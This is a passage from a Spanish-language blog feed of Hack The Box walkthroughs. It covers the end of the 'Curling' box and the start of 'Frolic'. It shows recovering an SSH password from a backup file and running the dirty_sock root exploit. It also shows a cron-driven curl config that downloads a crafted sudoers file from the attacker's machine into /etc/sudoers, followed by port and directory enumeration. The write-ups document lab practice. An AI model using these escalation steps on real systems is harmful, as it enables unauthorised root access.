&lt;h3 id=&#34;metasploit---sesion-meterpreter&#34;&gt;Metasploit - Sesion Meterpreter&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2019.09.43.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la carpeta /home/floris encontramos el flag &lt;code&gt;user.txt&lt;/code&gt; pero no tenemos permisos para leerlo, pero encontramos un archivo con el nombre de &lt;code&gt;password_backup&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2019.12.07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;code&gt;xxd&lt;/code&gt; para verificar el archivo, al consulatar la firma de archivos encontramos que es un archivo de tipo &lt;code&gt;bzip2&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.garykessler.net/library/file_sigs.html&#34;&gt;https://www.garykessler.net/library/file_sigs.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2019.27.18.webp&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2019.32.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos nuevamente xxd para escribir este archivo en /tmp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;xxd -r /home/floris/password_backup &amp;gt; /tmp/backup.bz2
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2019.31.23.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Pasamos nuestro archivo a base64 para poder extraerlo localmente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/curling# cat base64 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; base64 -d &amp;gt; backup.bz2
root@sckull:~/htb/curling# bzip2 -d backup.bz2 
root@sckull:~/htb/curling# ls
backup  base64  batman.php  mod_simplefileuploadJ30v1.3.5.zip
root@sckull:~/htb/curling# cat backup
�l&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;password�r�BZh91AY&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;SY6Ǎ����@@!PtD�� t&lt;span class=&#34;s2&#34;&gt;&amp;#34;d�hhOPIS@��6��8ET&amp;gt;P@�#I bՃ|3��x���������(*N�&amp;amp;�H��k1��x��&amp;#34;&lt;/span&gt;�&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;�ೱ��&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;��B@�6�m��root@sckull:~/htb/curling# file backup
backup: gzip compressed data, was &lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;, last modified: Tue May &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 19:16:20 2018, from Unix, original size &lt;span class=&#34;m&#34;&gt;141&lt;/span&gt;
root@sckull:~/htb/curling# mv backup file.gz
root@sckull:~/htb/curling# gunzip file.gz 
root@sckull:~/htb/curling# ls
base64  batman.php  file  mod_simplefileuploadJ30v1.3.5.zip
root@sckull:~/htb/curling# file file 
file: bzip2 compressed data, block &lt;span class=&#34;nv&#34;&gt;size&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 900k
root@sckull:~/htb/curling# bzip2 -d file.bz2 
root@sckull:~/htb/curling# ls
base64  batman.php  file  mod_simplefileuploadJ30v1.3.5.zip
root@sckull:~/htb/curling# cat file 
password.txt0000644000000000000000000000002313301066143012147 0ustar  rootroot5d&amp;lt;wdCbdZu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;hChXll
root@sckull:~/htb/curling# file file 
file: POSIX tar archive &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GNU&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@sckull:~/htb/curling# tar xvf file
password.txt
root@sckull:~/htb/curling# cat password.txt 
5d&amp;lt;wdCbdZu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;hChXll
root@sckull:~/htb/curling#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Finalmente despues de pasar por varios archivos nos encontramos con una contraseña dentro del archivo &lt;code&gt;password.txt&lt;/code&gt;, vamos a utilizarla para el usuario Floris en el servicio ssh y obtenemos nuestra bandera &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2019.46.48.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Realizamos una enumeracion de posibles exploits con &lt;code&gt;linux-exploit-suggester&lt;/code&gt; dentro del directorio /tmp, esto para facilitarnos una escalada de privilegios.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2019.56.56.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://initblog.com/2019/dirty-sock/&#34;&gt;https://initblog.com/2019/dirty-sock/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Encontramos el &lt;code&gt;CVE-2019-7304&lt;/code&gt; de &lt;code&gt;dirty_sock&lt;/code&gt; que podria ayudarnos para escalar  privilegios, descargamos y ejecutamos nuestro exploit en /tmp, el cual nos creara un usario con privilegios root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2020.03.23.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Cambiamos de usuario con su al usuario &lt;code&gt;dirty_sock&lt;/code&gt;, y obtenemos privilegios root y la bandera &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2020.07.11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;privilege-escalation-v2&#34;&gt;PRIVILEGE ESCALATION v2&lt;/h2&gt;
&lt;p&gt;Para esta &lt;code&gt;Curling&lt;/code&gt; tenemos otra forma de obtener root, para ello utilizamos &lt;code&gt;pspy&lt;/code&gt; para ver los cron que se ejecutan.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2020.26.47.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Observamos que hay uno cronjob que ejecuta un comando el cual copia un archivo llamado &lt;code&gt;default.txt&lt;/code&gt; a &lt;code&gt;/home/floris/admin-area/input&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;cat /root/default.txt &amp;gt; /home/floris/admin-area/input
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Y otro que hace uso de &lt;code&gt;curl&lt;/code&gt; y mediante un archivo hace una consulta el cual lo guarda en &lt;code&gt;report&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sabiendo lo anterior podemos crear un archivo sudoers que contenga permisos de usuario root para el usuario &lt;code&gt;floris&lt;/code&gt;, utilizar un servidor local para que el cron haga la consulta, descargue el archivo y lo guarde en el archivo de &lt;code&gt;sudoers&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudoers&lt;/code&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2020.36.20.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;python-http-server&#34;&gt;Python HTTP Server&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2020.35.42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Editamos el archivo input con lo siguiente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;url&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.12.11/sudoers&amp;#34;&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;output&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/etc/sudoers&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2020.41.11.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/curling/Screenshot%20from%202019-03-28%2020.40.40.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/curling/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/curling/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Frolic</title>
        <link>https://sckull.github.io/posts/frolic/</link>
        <pubDate>Sun, 24 Mar 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sun, 24 Mar 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/frolic/</guid>
        <description>Frolic es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Frolic es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/frolic/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h2 id=&#34;masscan&#34;&gt;Masscan&lt;/h2&gt;
&lt;p&gt;Realizamos un escaneo de puertos udp y tcp con masscan.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;masscan -p1-65535,U:1-65535 10.10.10.111 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 139/tcp on 10.10.10.111                                   
Discovered open port 9999/tcp on 10.10.10.111
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;nmap&#34;&gt;NMAP&lt;/h2&gt;
&lt;p&gt;Escaneando el servicio que corre en los puertos encontrados con masscan.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.111
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.0s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT     STATE SERVICE     VERSION
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
9999/tcp open  http        nginx 1.10.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Service Info: Host: FROLIC&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 16.19 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;samba&#34;&gt;SAMBA&lt;/h2&gt;
&lt;p&gt;Un escaneo de puntos compartidos con smbclient, no encontramos mucho que nos pudiese ayudar.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~# smbclient -L 10.10.10.111
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	IPC$            IPC       IPC Service &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;frolic server &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Samba, Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Reconnecting with SMB1 &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            FRIENDZONE
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr /&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Un escaneo de rutas y archivos con gobuster al puerto 9999.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -u http://10.10.10.111:9999/ -q -np -x php,html,txt,js -t &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;
/admin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/backup &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/dev &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/test &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/playsms &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro de la ruta /admin encontramos un panel de administracion que necesita un usuario y contraseña&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/frolic/Screenshot%20from%202019-03-22%2018-06-04.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En /backup encontramos password.txt y user.txt que contienen una contraseña y usuario respectivamente:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/frolic/Screenshot%20from%202019-03-22%2018-07-02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;passsword.txt -&amp;gt; password - imnothuman
user.txt -&amp;gt; user - admin
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;En la ruta /dev y /loop no encontramos nada, dentro de /test informacion de la version de php corriendo en la maquina.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/frolic/Screenshot%20from%202019-03-22%2018-09-07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Finalmente en /playsms encontramos un login:&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/frolic/Screenshot%20from%202019-03-22%2019-00-46.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;admin&#34;&gt;/admin&lt;/h2&gt;
&lt;p&gt;Analizando el codigo de la ruta /admin encontramos que contiene un archivo de javascript llamado login.js:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
